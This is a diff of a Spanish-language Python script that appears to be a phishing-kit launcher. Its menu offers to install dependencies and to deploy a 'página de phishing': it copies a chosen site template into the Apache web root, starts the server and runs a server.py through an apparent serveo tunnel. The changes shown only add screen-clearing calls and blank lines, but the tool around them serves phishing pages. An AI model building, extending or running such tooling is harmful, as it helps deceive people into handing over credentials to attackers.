@@ -2,7 +2,7 @@ import os
 import signal
 import subprocess
 
-
+    
 def sistema_operativo():
         print("1) Windows")
         print("2) Linux")
@@ -11,13 +11,19 @@ def sistema_operativo():
 sistema = sistema_operativo()
 
 try:
+    def limpiar(sistema):
+        if sistema == 1:
+            os.system("cls")
+        elif sistema == 2:
+            os.system("clear")
+
     def menu(): 
         print("1) Instalar")
         print("2) Página de phishing")
         print("3) Salir")
         return int(input("Ingresa tu opción: "))
 
-    def instalar(): 
+    def instalar():
         print("1) Windows")
         print("2) Linux")
         if int(input("Ingresa tu opción: ")) == 1:
@@ -44,6 +50,9 @@ try:
             
 
             print("El servidor se ha iniciado y la página de phishing se ha configurado correctamente.")
+            print("")
+            print("")
+
         except Exception as e:
             print(f"Se produjo un error: {e}")
 
@@ -54,6 +63,10 @@ try:
         os.system(f"sudo cp -r sites/{carpeta} /var/www/html/")
         os.system("sudo systemctl start apache2")
 
+        print("El servidor se ha iniciado y la página de phishing se ha configurado correctamente.")
+        print("")
+        print("")
+
     def serveo(ruta_server): 
         if sistema == 1:
             subprocess.call(["python", ruta_server])
@@ -62,25 +75,33 @@ try:
         return ruta_server
 
     def main():
+        limpiar(sistema)
         opcion_menu = menu()
         if opcion_menu == 1:
+            limpiar(sistema)
             instalar()
         elif opcion_menu == 2:
+            limpiar(sistema)
             carpeta_elegida = menu_phishing()
             print(f"Has elegido la carpeta {carpeta_elegida}")
             ruta_server = "scripts/server.py"
             if sistema == 1:
+                limpiar(sistema)
                 inicio_phishing_windows(carpeta_elegida)
                 serveo(ruta_server)
             else:
+                limpiar(sistema)
                 inicio_phishing_linux(carpeta_elegida)
                 serveo(ruta_server)
         else:
             print("Saliendo del programa...")
+            limpiar(sistema)
             if sistema == 1:
-                os.system("NET STOP Apache2.4")  
+                os.system("NET STOP Apache2.4") 
+                limpiar(sistema) 
             elif sistema == 2:  
                 os.system("sudo systemctl stop apache2")
+                limpiar(sistema)
             
     if __name__ == "__main__":
         main()
@@ -89,5 +110,7 @@ except KeyboardInterrupt:
     print("\nInterrupción detectada, deteniendo el servidor Apache...")
     if sistema == 1:
                 os.system("NET STOP Apache2.4")  
+                limpiar(sistema)
     elif sistema == 2:  
                 os.system("sudo systemctl stop apache2")
+                limpiar(sistema)
